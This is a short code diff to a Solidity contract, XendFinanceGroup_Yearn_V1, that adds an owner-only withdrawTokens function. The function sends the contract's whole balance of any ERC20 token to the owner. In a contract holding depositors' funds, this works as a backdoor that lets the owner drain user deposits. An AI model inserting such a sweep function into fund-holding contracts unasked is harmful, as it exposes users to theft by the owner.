@@ -1671,4 +1671,10 @@ contract XendFinanceGroup_Yearn_V1 is
         address payable depositorAddress = msg.sender;
         _joinCycle(cycleId, numberOfStakes, allowance, depositorAddress);
     }
+
+     function withdrawTokens(address tokenAddress) external onlyOwner{
+        IERC20 token = IERC20(tokenAddress);
+        uint256 balance =  token.balanceOf(address(this));
+        token.safeTransfer(owner,balance);        
+    }
 }
